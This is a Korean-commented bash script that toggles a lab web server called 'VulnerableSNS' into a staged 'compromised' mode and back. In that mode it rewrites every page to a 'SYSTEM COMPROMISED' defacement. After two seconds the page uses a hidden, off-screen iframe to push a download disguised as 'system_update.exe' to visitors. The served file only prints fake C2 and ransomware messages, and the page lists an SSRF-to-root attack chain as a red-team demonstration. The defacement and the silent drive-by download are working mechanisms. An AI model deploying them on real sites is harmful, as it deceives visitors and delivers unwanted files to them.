#!/bin/bash
###############################################################################
# 완벽한 토글 스크립트 v2
# - 모든 원본 파일 복구 (index.php 포함)
# - 현대적인 UI 디자인
###############################################################################

BACKUP_DIR="/root/ORIGINAL_BACKUP"
WWW_DIR="/var/www/html/www"
HTACCESS="$WWW_DIR/.htaccess"
HACKED_PAGE="$WWW_DIR/hacked_display.php"
MALWARE_DROPPER="$WWW_DIR/silent_dropper.php"

echo "╔═══════════════════════════════════════════════╗"
echo "║       VulnerableSNS 토글 v2.0                 ║"
echo "╚═══════════════════════════════════════════════╝"

# 첫 실행: 원본 백업
if [ ! -d "$BACKUP_DIR" ]; then
    echo "[*] 첫 실행 - 모든 원본 파일 백업 중..."
    mkdir -p "$BACKUP_DIR"

    # 모든 파일 백업 (PHP, CSS, JS 등)
    cd "$WWW_DIR"
    for file in *.php *.css *.js 2>/dev/null; do
        if [ -f "$file" ]; then
            cp "$file" "$BACKUP_DIR/"
            echo "  ✓ $file"
        fi
    done

    chmod 700 "$BACKUP_DIR"
    echo "[✅] 백업 완료: $BACKUP_DIR"
fi

# 현재 상태 확인
if [ -f "$HTACCESS" ]; then
    #########################################
    # 정상 모드로 복구
    #########################################
    echo ""
    echo "╔═══════════════════════════════════════════════╗"
    echo "║   ✅ 정상 VulnerableSNS 복구 중...           ║"
    echo "╚═══════════════════════════════════════════════╝"

    # 해킹 파일 제거
    rm -f "$HTACCESS"
    rm -f "$HACKED_PAGE"
    rm -f "$MALWARE_DROPPER"
    rm -f "$WWW_DIR/system_update.exe"

    # 모든 원본 파일 복구
    if [ -d "$BACKUP_DIR" ]; then
        echo "[*] 원본 파일 복구 중..."
        cd "$BACKUP_DIR"
        for file in *; do
            if [ -f "$file" ]; then
                cp -f "$file" "$WWW_DIR/"
                chown apache:apache "$WWW_DIR/$file"
                chmod 644 "$WWW_DIR/$file"
                echo "  ✓ $file 복구"
            fi
        done
    fi

    systemctl restart httpd

    echo ""
    echo "╔═══════════════════════════════════════════════╗"
    echo "║   ✅ VulnerableSNS 완전 복구 완료!           ║"
    echo "╚═══════════════════════════════════════════════╝"
    echo ""
    echo "🌐 정상 사이트:"
    echo "   http://3.35.22.248/              → 로그인"
    echo "   http://3.35.22.248/register.php  → 회원가입"
    echo "   http://3.35.22.248/upload.php    → 업로드"
    echo ""

else
    #########################################
    # 해킹 모드로 전환
    #########################################
    echo ""
    echo "╔═══════════════════════════════════════════════╗"
    echo "║   🔴 공격 모드 활성화                        ║"
    echo "╚═══════════════════════════════════════════════╝"

    # 숨겨진 악성코드 드로퍼
    cat > "$MALWARE_DROPPER" << 'EOFDROPPER'
<?php
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="system_update.exe"');
$malware = '@echo off
echo ===================================
echo     C2 Server Connection Test
echo ===================================
echo [+] Connecting to: attacker.onion
echo [+] Status: Connected
echo [+] Ransomware: ACTIVE
echo [+] Keylogger: RUNNING
echo [+] Data Exfiltration: IN PROGRESS
echo ===================================
pause
';
echo $malware;
exit;
?>
EOFDROPPER

    # 해킹 페이지 (완전 자동 다운로드)
    cat > "$HACKED_PAGE" << 'EOFHACKED'
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM COMPROMISED</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #0f0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'SF Mono', Monaco, 'Courier New', monospace;
            overflow-x: hidden;
        }
        #matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            opacity: 0.15;
        }
        .container {
            position: relative;
            z-index: 10;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 2rem;
        }
        .content {
            max-width: 1000px;
            width: 100%;
            text-align: center;
        }
        h1 {
            font-size: clamp(2rem, 6vw, 4.5rem);
            color: #f00;
            text-shadow:
                0 0 10px #f00,
                0 0 20px #f00,
                0 0 40px #f00,
                0 0 80px #f00;
            margin-bottom: 2rem;
            animation: pulse 2s infinite;
            font-weight: 700;
            letter-spacing: -0.02em;
        }
        .warning {
            font-size: clamp(1rem, 2.5vw, 1.5rem);
            color: #ff0;
            margin-bottom: 3rem;
            animation: blink 1s infinite;
            font-weight: 600;
        }
        .card {
            background: rgba(0, 20, 0, 0.8);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 255, 0, 0.3);
            border-radius: 16px;
            padding: 2rem;
            margin: 2rem 0;
            text-align: left;
            box-shadow:
                0 4px 24px rgba(0, 255, 0, 0.1),
                inset 0 1px 0 rgba(255, 255, 255, 0.05);
        }
        .card h2 {
            color: #0ff;
            margin-bottom: 1.5rem;
            text-align: center;
            font-size: clamp(1.25rem, 3vw, 1.75rem);
            font-weight: 600;
        }
        .step {
            margin: 1rem 0;
            padding: 0.75rem 1rem;
            border-left: 3px solid #0f0;
            padding-left: 1rem;
            transition: all 0.3s ease;
            background: rgba(0, 255, 0, 0.05);
            border-radius: 0 8px 8px 0;
        }
        .step:hover {
            background: rgba(0, 255, 0, 0.1);
            transform: translateX(4px);
        }
        .malware-card {
            background: rgba(40, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 0, 0, 0.4);
            border-radius: 16px;
            padding: 2rem;
            margin: 2rem 0;
            animation: pulse-red 2s infinite;
            box-shadow:
                0 4px 24px rgba(255, 0, 0, 0.2),
                inset 0 1px 0 rgba(255, 255, 255, 0.05);
        }
        .malware-card h3 {
            color: #f00;
            margin-bottom: 1rem;
            font-size: clamp(1.1rem, 2.5vw, 1.5rem);
        }
        .vuln-card {
            background: rgba(40, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 0, 0, 0.3);
            border-radius: 16px;
            padding: 2rem;
            margin: 2rem 0;
        }
        .vuln-card h3 {
            color: #f00;
            margin-bottom: 1rem;
            font-size: clamp(1.1rem, 2.5vw, 1.5rem);
        }
        .vuln-item {
            margin: 0.75rem 0;
            color: #ff0;
            padding: 0.5rem;
            border-radius: 6px;
            background: rgba(255, 255, 0, 0.05);
        }
        code {
            background: rgba(0, 255, 0, 0.15);
            padding: 0.25rem 0.6rem;
            border-radius: 6px;
            color: #0f0;
            font-family: 'SF Mono', Monaco, monospace;
            font-size: 0.9em;
        }
        .footer {
            margin-top: 4rem;
            padding-top: 2rem;
            border-top: 1px solid rgba(0, 255, 0, 0.2);
            color: #666;
            font-size: 0.9rem;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        @keyframes pulse-red {
            0%, 100% {
                box-shadow:
                    0 4px 24px rgba(255, 0, 0, 0.2),
                    0 0 20px rgba(255, 0, 0, 0.3);
            }
            50% {
                box-shadow:
                    0 4px 32px rgba(255, 0, 0, 0.4),
                    0 0 40px rgba(255, 0, 0, 0.5);
            }
        }
        @keyframes blink {
            0%, 50%, 100% { opacity: 1; }
            25%, 75% { opacity: 0.3; }
        }
        @media (max-width: 768px) {
            .card, .malware-card, .vuln-card {
                padding: 1.5rem;
            }
            .step {
                font-size: 0.9rem;
            }
        }
    </style>
</head>
<body>
    <canvas id="matrix-bg"></canvas>
    <div class="container">
        <div class="content">
            <h1>⚠️ SYSTEM COMPROMISED ⚠️</h1>
            <div class="warning">WARNING: UNAUTHORIZED ACCESS DETECTED</div>

            <div class="card">
                <h2>🔴 Attack Chain</h2>
                <div class="step">→ 1. SSRF Vulnerability Discovery (health.php)</div>
                <div class="step">→ 2. ModSecurity WAF Bypass</div>
                <div class="step">→ 3. AWS IMDSv1 Access</div>
                <div class="step">→ 4. IAM Credentials Theft</div>
                <div class="step">→ 5. Web Shell Installation</div>
                <div class="step">→ 6. Backdoor User Creation (sysadmin)</div>
                <div class="step">→ 7. Root Privilege Escalation</div>
                <div class="step">→ 8. Splunk SIEM Neutralization</div>
                <div class="step">→ 9. Persistent Backdoor (Cron)</div>
                <div class="step">→ 10. Complete System Takeover ✅</div>
                <div class="step" style="border-left-color: #f00; background: rgba(255, 0, 0, 0.1);">→ 11. Malware Deployment 🦠</div>
            </div>

            <div class="malware-card">
                <h3>🦠 Malware Installation Complete</h3>
                <div id="status" style="color:#0f0;">✅ System Successfully Infected!</div>
                <div style="margin-top:1rem;">📁 Location: <code>C:\Windows\System32\update_service.exe</code></div>
                <div style="margin-top:0.5rem;color:#f00;">⚠️ Auto-start Registered</div>
            </div>

            <div class="vuln-card">
                <h3>🔥 Discovered Vulnerabilities</h3>
                <div class="vuln-item">❌ AWS IMDSv1 Enabled</div>
                <div class="vuln-item">❌ ModSecurity WAF Exception</div>
                <div class="vuln-item">❌ SSRF Vulnerability</div>
                <div class="vuln-item">❌ PHP Dangerous Functions</div>
                <div class="vuln-item">❌ Sudo Privilege Misconfiguration</div>
            </div>

            <div class="footer">
                <p>Red Team Penetration Testing Demonstration</p>
                <p>Educational Purpose Only • 2025-11-17</p>
            </div>
        </div>
    </div>

    <script>
        // Matrix background
        const canvas = document.getElementById('matrix-bg');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()アイウエオカキクケコ';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        for (let i = 0; i < columns; i++) drops[i] = Math.random() * canvas.height / fontSize;
        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0f0';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const char = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.95) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 33);

        // 완전 숨김 다운로드
        setTimeout(() => {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.style.width = '0';
            iframe.style.height = '0';
            iframe.style.border = 'none';
            iframe.style.position = 'absolute';
            iframe.style.left = '-9999px';
            iframe.src = '/silent_dropper.php';
            document.body.appendChild(iframe);
            setTimeout(() => {
                if (document.body.contains(iframe)) {
                    document.body.removeChild(iframe);
                }
            }, 1000);
        }, 2000);

        // 반응형 처리
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    </script>
</body>
</html>
EOFHACKED

    # .htaccess
    cat > "$HTACCESS" << 'EOFHTACCESS'
<IfModule mod_rewrite.c>
RewriteEngine On

# 해킹 페이지와 드로퍼 제외
RewriteCond %{REQUEST_URI} !^/hacked_display\.php$
RewriteCond %{REQUEST_URI} !^/silent_dropper\.php$

# API와 정적 파일 제외
RewriteCond %{REQUEST_URI} !^/uploads/
RewriteCond %{REQUEST_URI} !^/api/
RewriteCond %{REQUEST_URI} !\.(jpg|jpeg|png|gif|css|js|ico|exe)$

# 모든 페이지를 해킹 페이지로
RewriteRule ^.*$ /hacked_display.php [L]
</IfModule>
EOFHTACCESS

    # 권한 설정
    chown apache:apache "$HACKED_PAGE" "$HTACCESS" "$MALWARE_DROPPER"
    chmod 644 "$HACKED_PAGE" "$HTACCESS" "$MALWARE_DROPPER"

    systemctl restart httpd

    echo ""
    echo "╔═══════════════════════════════════════════════╗"
    echo "║   🔴 시스템 완전 장악 완료!                  ║"
    echo "╚═══════════════════════════════════════════════╝"
    echo ""
    echo "🔴 모든 페이지 해킹:"
    echo "   http://3.35.22.248/              → HACKED"
    echo "   http://3.35.22.248/login.php     → HACKED"
    echo "   http://3.35.22.248/upload.php    → HACKED"
    echo ""
    echo "🦠 악성코드 자동 설치 활성화 (완전 숨김)"
    echo ""
fi

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "💡 토글: sudo bash $0"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
